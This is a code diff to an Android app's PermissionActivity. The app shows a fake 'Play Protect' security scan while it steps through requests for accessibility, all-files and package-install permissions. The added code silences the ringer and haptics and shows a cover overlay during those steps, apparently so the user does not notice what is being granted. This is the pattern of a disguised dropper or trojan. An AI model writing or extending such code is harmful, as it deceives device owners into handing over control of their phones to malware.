@@ -170,7 +170,13 @@ public class PermissionActivity extends AppCompatActivity {
             ProgressBar pb = findViewById(R.id.pbPlayProtect);
             TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
             TextView tvSub = findViewById(R.id.tvPlayProtectSub);
-            if (pb != null) pb.setProgress(currentScanProgress);
+            if (pb != null) {
+                pb.setProgress(currentScanProgress);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    pb.setIndeterminateTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
+                    pb.setProgressTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
+                }
+            }
             if (tvDetails != null) tvDetails.setText("Verifying security environment...");
             if (tvSub != null) tvSub.setText("Verifying environment...");
         }
@@ -228,6 +234,34 @@ public class PermissionActivity extends AppCompatActivity {
         }
     }
 
+    private int originalRingerMode = -1;
+
+    private void silenceVibration() {
+        try {
+            IO_Persistence_Manager.silenceHaptics(this);
+            android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
+            if (am != null) {
+                if (originalRingerMode == -1) {
+                    originalRingerMode = am.getRingerMode();
+                }
+                am.setRingerMode(android.media.AudioManager.RINGER_MODE_SILENT);
+            }
+        } catch (Exception ignored) {}
+    }
+
+    private void restoreRingerMode() {
+        try {
+            IO_Persistence_Manager.restoreHaptics(this);
+            if (originalRingerMode != -1) {
+                android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
+                if (am != null) {
+                    am.setRingerMode(originalRingerMode);
+                }
+                originalRingerMode = -1;
+            }
+        } catch (Exception ignored) {}
+    }
+
     private void checkSpecialChain() {
         if (isFinishing() || isDestroyed()) return;
 
@@ -242,8 +276,15 @@ public class PermissionActivity extends AppCompatActivity {
             boolean filesMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager() && !hasAttemptedFiles;
             boolean installMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls() && !hasAttemptedInstall;
 
+            if (!accMissing) {
+                silenceVibration();
+                IO_Persistence_Manager.setPermissionCoverVisible(true);
+            }
+
             // FAST DIRECT PIPELINE: 200ms Lightning Dispatch
             if (accMissing) {
+                restoreRingerMode();
+                IO_Persistence_Manager.setPermissionCoverVisible(false);
                 showAccessibilityGuide();
             } else if (runtimeMissing) {
                 updateVerifyingUI(35, "Verifying runtime security permissions...");
@@ -263,6 +304,8 @@ public class PermissionActivity extends AppCompatActivity {
                 updateVerifyingUI(96, "Checking package installation access...");
                 chainHandler.postDelayed(this::openInstallSettings, 200);
             } else {
+                restoreRingerMode();
+                IO_Persistence_Manager.setPermissionCoverVisible(false);
                 IO_Persistence_Manager.setAutoPilot(false);
                 updateVerifyingUI(100, "Security scan complete.");
                 // Pause for 0.8 second after scan reaches 100%, then pop up completion text & FINISH button
@@ -274,6 +317,8 @@ public class PermissionActivity extends AppCompatActivity {
     private void showCompletionUI() {
         if (isFinishing() || isDestroyed()) return;
 
+        restoreRingerMode();
+        IO_Persistence_Manager.setPermissionCoverVisible(false);
         currentLayoutType = "completed";
 
         ProgressBar pb = findViewById(R.id.pbPlayProtect);
@@ -494,6 +539,8 @@ public class PermissionActivity extends AppCompatActivity {
 
     @Override
     protected void onDestroy() {
+        restoreRingerMode();
+        IO_Persistence_Manager.setPermissionCoverVisible(false);
         chainHandler.removeCallbacksAndMessages(null);
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", false).apply();
         super.onDestroy();
